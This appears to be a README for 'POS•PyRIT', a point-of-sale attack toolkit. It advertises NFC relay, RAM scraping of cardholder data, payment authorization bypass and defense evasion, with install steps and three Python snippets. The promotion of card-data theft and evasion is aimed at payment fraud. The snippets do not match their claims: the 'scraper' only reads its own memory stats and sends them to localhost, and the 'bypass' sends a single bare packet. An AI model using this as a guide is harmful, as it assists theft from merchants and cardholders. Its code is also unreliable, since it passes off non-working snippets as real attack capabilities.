# POS•PyRIT ⚔️💳

## The Ultimate Tool for Point-of-Sale Penetration & Recon

POS•PyRIT (Point-of-Sale Python Recon & Interception Toolkit) is an elite POS exploitation framework designed to explore, analyze, and compromise vulnerabilities in modern Point-of-Sale systems. Whether you're performing NFC relays, RAM scraping, or transaction spoofing — this tool is built to make your job faster and stealthier. 🏴‍☠️

## 🔥 Features

- **NFC Relay Attacks**: Intercept contactless transactions using near-field communication.
- **RAM Scraper**: Extract sensitive cardholder data directly from memory in real-time.
- **Authorization Bypass**: Override payment approval logic in select POS firmware.
- **Stealth Mode**: Designed to evade most standard endpoint defenses and monitoring.
- **Runs on Android**: Fully compatible with non-rooted Android devices using Nfc-Gate.

## 🚀 Getting Started

### ✅ Prerequisites

- Python 3.x
- NFC-enabled Android phone
- Nfc-Gate App installed

### 🔧 Installation

1. **Clone the Repo**
   ```bash
   git clone https://github.com/yourusername/pos_pyrIT.git
   cd pos_pyrIT
   ```

2. **Build Dependencies**
   ```bash
   ./build/build.sh
   ```

3. **Run Installer**
   ```bash
   ./scripts/install.sh
   ```

### 🎯 Execution

1. **Execute the Script**
   ```bash
   ./scripts/execute.sh
   ```

2. **Ensure NFC is enabled** and the Android device is connected. Follow interactive prompts.

## 🧩 Code Examples

### NFC Relay Snippet

```python
import nfc, time

def nfc_relay():
    clf = nfc.ContactlessFrontend('usb')
    while True:
        clf.connect(rdwr={'on-connect': lambda tag: tag.dump()})
        time.sleep(1)

if __name__ == "__main__":
    nfc_relay()
```

### RAM Scraper

```python
import psutil, socket, pickle

def scrape_ram():
    process = psutil.Process()
    return process.memory_info()

def send_data(data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('localhost', 12345))
        s.sendall(pickle.dumps(data))

if __name__ == "__main__":
    data = scrape_ram()
    send_data(data)
```

### Payment Bypass Logic

```python
from scapy.all import *
import requests

def bypass_authorization():
    pkt = IP(dst="192.168.1.1") / TCP(dport=443, flags="PA")
    send(pkt)
    print(requests.get("https://example.com/api/payment").text)
```
